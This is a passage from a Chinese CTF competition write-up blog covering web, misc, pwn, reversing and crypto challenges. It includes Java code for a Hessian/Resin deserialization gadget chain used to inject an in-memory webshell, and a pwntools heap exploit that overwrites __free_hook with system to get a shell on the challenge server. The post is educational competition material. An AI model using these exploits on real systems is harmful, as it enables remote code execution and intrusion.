nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">        <span class="comment">//Neepu&#123;Y0u_REa11Y_Haue_bean_D0Nt_U&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> ( target &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( target == Integer.MIN_VALUE )</span><br><span class="line">                <span class="keyword">return</span> answer.toString();</span><br><span class="line">            <span class="comment">// Find target without sign bit set</span></span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        <span class="keyword">return</span> answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span> <span class="params">( StringBuilder partial, <span class="type">int</span> target )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( div != <span class="number">0</span> )</span><br><span class="line">                partial.append((<span class="type">char</span>) div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过el包里的类动态执行代码，然后用到了resin链里的一个dircontenxt的getter去触发el包的eval函数，达到注入内存马的目的，需要注意的是贴合题目的hessian版本，题目的hessian是3.x，我们换成一样的，然后这里异常触发toString，需要手动write一个79进去，调试就可以发现是多少了<br>最后得到payload打入：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684675814735-97e83555-0b3d-43f6-a25f-ff46ce0cc667.png#averageHue=%23fefefe&clientId=u1e86b3c8-0e66-4&from=paste&height=347&id=u18ec2f5a&originHeight=434&originWidth=1247&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18353&status=done&style=none&taskId=ufdeea419-179a-40a4-8340-83fdec7fe1a&title=&width=997.6" alt="image.png"><br>这里flag没完全的原因是内存马以A分割，所以后面手动筛一下。这里就不筛了，有点累</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h2><p>首先拿到附件，象征性的看看hex<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684677741454-f6574378-615b-47b3-a73d-6c8f759d04df.png#averageHue=%23f6f4ef&clientId=u1e86b3c8-0e66-4&from=paste&height=281&id=u9818f128&originHeight=351&originWidth=806&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=209777&status=done&style=none&taskId=u369e882c-1205-41c3-b50d-b4ea41f9b90&title=&width=644.8" alt="image.png"><br>文件尾下面还有东西，是个颠倒的png，反手就是一个binwalk<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684677747338-a7a4d960-ca24-428f-b8ea-659af756e9a5.png#averageHue=%230c0c0b&clientId=u1e86b3c8-0e66-4&from=paste&height=70&id=u024706ca&originHeight=88&originWidth=865&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23926&status=done&style=none&taskId=u0139c801-d30b-44ad-837d-b63451d93a5&title=&width=692" alt="image.png"><br>手动分离一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684677751878-9e0dca99-1a6c-440f-8547-387c2537d951.png#averageHue=%23d4d7f4&clientId=u1e86b3c8-0e66-4&from=paste&height=386&id=u8dd6b9d3&originHeight=482&originWidth=865&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=446731&status=done&style=none&taskId=u98477982-206c-4d54-87af-e3102959ff5&title=&width=692" alt="image.png"><br>结合题目倒影，逆一下数据，得到了如下图片<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684677758578-8c67ef70-4597-406b-bb18-22f029945684.png#averageHue=%231c3e60&clientId=u1e86b3c8-0e66-4&from=paste&height=519&id=u7b4c1e69&originHeight=649&originWidth=865&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1172362&status=done&style=none&taskId=udca27e40-7b23-43d5-8d1e-283b65dbe4e&title=&width=692" alt="image.png"><br>虽然看起来是原图，但是盲水印处理一下之后就发现flag了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684677807403-758b85f1-4836-4c9e-8250-8441520170a5.png#averageHue=%23302f2f&clientId=u1e86b3c8-0e66-4&from=paste&height=206&id=u600eba75&originHeight=257&originWidth=1104&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111567&status=done&style=none&taskId=ucb59b05c-c02c-41f9-989a-ee2d48ef5ed&title=&width=883.2" alt="image.png"></p>
<h2 id="重生之我是CTFer"><a href="#重生之我是CTFer" class="headerlink" title="重生之我是CTFer"></a>重生之我是CTFer</h2><p>我是觉得挺玄学的，我当时做的时候就是写一个脚本直接跑flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://neepusec.fun:28240/update&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r=requests.get(url+<span class="string">&quot;?buttonId=1&quot;</span>)</span><br><span class="line">    a=r.content.decode(<span class="string">&quot;unicode_escape&quot;</span>)</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">&quot;Neepu&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<p>当时结果中手动筛一下就有了，现在跑半天好像也没看见flag，不知道是什么原因，复现出问题了，可能我这是非预期，看脸吧，但确实是这么出的。他flag会出现在回答里</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Chall1"><a href="#Chall1" class="headerlink" title="Chall1"></a>Chall1</h2><p>老套路了 用一个副chunk来索引 释放两个chunk 申请一个0x10的chunk即可劫持副chunk 从而任意地址写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;neepusec.fun&quot;</span>,<span class="number">28282</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/tmp/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Leave me your choice &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter Size &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter Context &gt; &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Leave me your choice &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter idx &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Leave me your choice &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter idx &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Leave me your choice &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter idx &gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter Context &gt; &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x79</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x20</span>,cyclic(<span class="number">0x8</span>))</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebc60</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0x100</span>)*<span class="number">2</span>+p64(free_hook)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">5</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2><p>go逆向，根据字符串+内存断点+动调&#x3D;定位到关键调用处，无法F5<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684676095389-d7be347d-c711-4160-a6c1-cd00fa329d7e.png#averageHue=%23cafdfd&clientId=u1e86b3c8-0e66-4&from=paste&id=u0e069de2&originHeight=776&originWidth=1523&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ubfe880e7-8dcc-4099-b379-2fecc634fb9&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684676095267-5391bc81-c7f6-42a6-89cb-d52ab5710cb8.png#averageHue=%23c4f7f7&clientId=u1e86b3c8-0e66-4&from=paste&id=u7cd14039&originHeight=137&originWidth=760&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u2eb56530-89ac-4630-83a1-41445921921&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684676095317-56449b64-4be7-4256-8362-cdbf81feb4bf.png#averageHue=%23c9fcfb&clientId=u1e86b3c8-0e66-4&from=paste&id=uf757de09&originHeight=605&originWidth=1629&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ueeab765d-1590-4e18-b0cd-24ae33966a3&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684676095373-d9f533fc-8a5d-4326-9aa5-c8b96f2b1bff.png#averageHue=%23c9fdfc&clientId=u1e86b3c8-0e66-4&from=paste&id=u04b8e2fe&originHeight=233&originWidth=1171&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u1d5fcad3-9454-4f5b-a697-ba4075eab10&title="><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684676095396-59802886-99ff-423e-b7ab-97de76a18a6f.png#averageHue=%23c8fcfb&clientId=u1e86b3c8-0e66-4&from=paste&id=u2bb1e121&originHeight=707&originWidth=1360&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uc0afe53b-ab17-412d-a0df-ba107f469d3&title="><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684676096276-697b5a35-9027-4472-aec4-7aa4e5782971.png#averageHue=%23fefee0&clientId=u1e86b3c8-0e66-4&from=paste&id=uac020569&originHeight=748&originWidth=490&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u26d3d552-9767-406f-8bf6-5e12ee886f7&title="><br>找到了密文<br>xor 操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key = &quot;qwer&quot;</span><br><span class="line">a = [0x3F, 0x12, 0, 0x2, 0x4, 0x0C, 0x3D, 0x42, 0x3, 0x28,0x0C, 0x1, 0x2E, 0x12, 0x4, 0x1, 0x8, 0x28, 0x54, 0x40,0x42, 0x43, 0x54, 0x40, 0x42, 0x43, 0x54, 0x40, 0x42, 0x43,0x50, 0x0F]</span><br><span class="line">for i in range(len(a)):</span><br><span class="line">    print(chr((a[i])^ord(key[i%len(key)])),end=&quot;&quot;)</span><br></pre></td></tr></table></figure>



<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="FunnyRSA"><a href="#FunnyRSA" class="headerlink" title="FunnyRSA"></a>FunnyRSA</h2><p>面向chatgpt解题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里假设n, c1, c2已经赋值</span></span><br><span class="line">n = <span class="number">508480854372756755913791101745305762457517298159680989644747340327036977578527505318324958633232739687251409520866901608437945927574543155971443209922394847753303798988837755432365056098925797113097436966052676591464802061455795339989784949253878654243424430112737855583276666468348152646780267313723933052043652043457805179867064143032058107197027709609118240936819964179830722897401341043667501298533160902654255596452348828855631402136248161345374217307571507612687845128249648000080509946611349654016724007920186542131491886281036913471846314065665956824568534254734060468248256266109011728508043378818494008953002180704766570040343479609214117050941617109009620565019399761765253703071237034374358239723604390448411521487409469419576049566386525066685041905464761757345225778527338430347014422459954532168552493706796761693553297732745470452288495224654530482329002451540376107539184656257369225752541361996356642232449580990809290287044068126307915255465596308681516279323181254599943979030260297865604529605690218915679197797309258313924963034175283390070634287196300753230812822254122160704736109171545494720552113142650620106205647711854004731168393093254452512276389945341818288720153371447538338764655583233355044033698253</span></span><br><span class="line">c1 = <span class="number">1811190934126864017324358781557112607374925418749516169609783406151778537247582927245777048528376193187995730195136886128337489858508361912939739791856453029029472008503849636323475596821894021085406391087644300429282015652303512547583242875798709634440100351468653278854842376234162516591017755925768811542318681182791159664625408669418924102547889582147686273287037619637618739708338600060067635958832146122636281342410738805977631878905617340110767089538025585058506632889042141695774769826454213414615721715636679099281147824773004445559938086334729812819928608583224897377</span></span><br><span class="line">c2 = <span class="number">1811190934126215446529071930741680264692977139619905040341005151859262108274517137265678557572492828489893194367167654758053594788011553732879515384560058991329510784064663694630185446691719067568301787531371222824387708333506516529733748678922237489408939959514323606685743623252207828521187611779499933755917362989498814533543187953292778103169396201846967129948852571401049722315868171878019092456148722460556718133719135760731272749757567134824207749502257733682109147655913082871175866165600126790860696667477234801385030312215992287472679447108548071925392484907398967137</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cube_root</span>(<span class="params">n</span>):</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = n</span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid**<span class="number">3</span> &lt; n:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="keyword">return</span> low</span><br><span class="line"></span><br><span class="line">m1 = cube_root(c1)</span><br><span class="line">m2 = cube_root(c2)</span><br><span class="line"></span><br><span class="line">m1_str = long_to_bytes(m1)</span><br><span class="line">m2_str = long_to_bytes(m2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m1_str)</span><br><span class="line"><span class="built_in">print</span>(m2_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684676490255-b8f3f0d7-6393-42bf-a96b-d7969bb6f9cd.png#averageHue=%23202226&clientId=u1e86b3c8-0e66-4&from=paste&height=759&id=u634da9a5&originHeight=949&originWidth=1608&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105526&status=done&style=none&taskId=u4abdce0c-1800-44b8-b6fc-ae8b5685b9b&title=&width=1286.4" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/Neepu/" class="tag">#Neepu</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/05/22/Boogipop%E6%9C%80%E8%BF%91%E9%9B%B6%E6%95%A3%E3%81%AE%E5%AE%89%E6%8E%92/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Boogipop最近零散の安排</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/05/18/Resin&amp;&amp;XBean%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Resin&amp;&amp;XBean反序列化利用链学习</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>